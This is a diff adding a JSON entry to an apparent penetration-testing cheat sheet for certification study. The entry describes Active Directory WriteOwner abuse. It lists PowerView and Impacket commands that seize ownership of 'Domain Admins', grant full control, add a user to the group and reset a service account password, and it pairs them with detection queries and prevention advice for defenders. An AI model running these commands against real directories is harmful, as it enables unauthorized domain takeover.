@@ -1,0 +1,99 @@
+{
+  "id": "ad-writeowner-abuse",
+  "name": "WriteOwner Abuse - Take Ownership & Full Control",
+  "command": "Set-DomainObjectOwner -Identity <target_object> -OwnerIdentity <attacker_user>",
+  "description": "WriteOwner permission allows changing the owner of an AD object. Once you own an object, you can grant yourself GenericAll (full control) over it, then exploit any of the GenericAll abuse paths. This is a two-step escalation: take ownership, then grant permissions, then abuse.",
+  "platform": "windows",
+  "type": "attack-chain",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "ACL Abuse",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "CRTP ACL abuse module; BloodHound documentation",
+  "tags": [
+    "writeowner",
+    "acl-abuse",
+    "take-ownership",
+    "genericall",
+    "privilege-escalation"
+  ],
+  "mitre": [
+    "T1222.001"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== STEP 1: TAKE OWNERSHIP ===\n  # PowerView\n  Set-DomainObjectOwner -Identity \"Domain Admins\" -OwnerIdentity jdoe\n  # Or target a user:\n  Set-DomainObjectOwner -Identity svc_admin -OwnerIdentity jdoe\n\n=== STEP 2: GRANT FULL CONTROL ===\n  Add-DomainObjectAcl -TargetIdentity \"Domain Admins\" -PrincipalIdentity jdoe -Rights All\n  # Or specific right:\n  Add-DomainObjectAcl -TargetIdentity svc_admin -PrincipalIdentity jdoe -Rights ResetPassword\n\n=== STEP 3: ABUSE ===\n  # If target is a group - add yourself:\n  Add-DomainGroupMember -Identity \"Domain Admins\" -Members jdoe\n  # If target is a user - reset password:\n  Set-DomainUserPassword -Identity svc_admin -AccountPassword (ConvertTo-SecureString \"NewPass123!\" -AsPlainText -Force)\n  # Or use any GenericAll abuse path\n\n=== IMPACKET (LINUX) ===\n  # owneredit.py\n  python3 owneredit.py -action write -owner jdoe -target \"Domain Admins\" <domain>/<user>:<pass>\n  # dacledit.py\n  python3 dacledit.py -action write -rights FullControl -principal jdoe -target \"Domain Admins\" <domain>/<user>:<pass>",
+  "examples": [
+    {
+      "label": "Take ownership of Domain Admins group",
+      "command": "Set-DomainObjectOwner -Identity \"Domain Admins\" -OwnerIdentity jdoe"
+    },
+    {
+      "label": "Grant yourself full control",
+      "command": "Add-DomainObjectAcl -TargetIdentity \"Domain Admins\" -PrincipalIdentity jdoe -Rights All"
+    },
+    {
+      "label": "Linux - owneredit.py + dacledit.py",
+      "command": "python3 owneredit.py -action write -owner jdoe -target \"Domain Admins\" corp.local/jdoe:Password123"
+    }
+  ],
+  "references": [
+    {
+      "title": "BloodHound - WriteOwner Edge",
+      "url": "https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html"
+    },
+    {
+      "title": "MITRE T1222.001 - Windows File and Directory Permissions Modification",
+      "url": "https://attack.mitre.org/techniques/T1222/001/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-genericwrite-abuse",
+      "note": "After granting GenericWrite, use these abuse paths.",
+      "rel": "next"
+    },
+    {
+      "id": "ad-impacket-dacledit",
+      "note": "dacledit.py grants permissions from Linux after ownership change.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Object owners in AD have implicit permission to modify the DACL (access control list). Taking ownership is the prerequisite to granting yourself any permission on the object.",
+    "prerequisites": "WriteOwner permission on the target AD object.",
+    "impact": "Full control over the target object; if the target is a privileged group or user, leads to domain compromise.",
+    "detection": "[MITRE T1222.001] Event 4670 (permissions changed) and 5136 (owner changed) on sensitive objects.",
+    "artifacts": "Event 4670 (object ACL changed); Event 5136 showing owner attribute modification; subsequent 4728/4732 (group membership changes).",
+    "splunk_spl": "index=windows EventCode=5136 AttributeLDAPDisplayName=\"nTSecurityDescriptor\"\n| table _time, SubjectUserName, ObjectDN, AttributeValue\n| where match(ObjectDN, \"(?i)admin|domain admins|enterprise\")",
+    "elastic_kql": "event.code:\"5136\" AND winlog.event_data.AttributeLDAPDisplayName:\"nTSecurityDescriptor\"",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 5136\n| where AttributeLDAPDisplayName == \"nTSecurityDescriptor\"\n| where ObjectDN has_any (\"Domain Admins\", \"Enterprise Admins\", \"Administrators\")\n| project TimeGenerated, SubjectUserName, ObjectDN",
+    "sigma_rules": "win_security_writeowner_abuse_acl_change",
+    "prevention": "Audit WriteOwner permissions on sensitive objects; monitor ACL changes on privileged groups/users; implement AdminSDHolder protection.",
+    "sources": [
+      "CRTP ACL module",
+      "https://attack.mitre.org/techniques/T1222/001/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "WriteOwner abuse - ownership change on privileged object",
+        "logic": "SecurityEvent\n| where EventID == 5136\n| where AttributeLDAPDisplayName == \"nTSecurityDescriptor\"\n| where ObjectDN has_any (\"Domain Admins\", \"Enterprise Admins\", \"Schema Admins\", \"Administrators\", \"Account Operators\")\n| project TimeGenerated, SubjectUserName, ObjectDN, OperationType",
+        "data_source": "windows-security",
+        "log_ids": [
+          "5136"
+        ],
+        "attack": [
+          "T1222.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate ACL management by authorized administrators",
+        "tuning": "Alert on any ownership/ACL change on tier-0 objects; whitelist only authorized admin accounts"
+      }
+    ]
+  }
+}
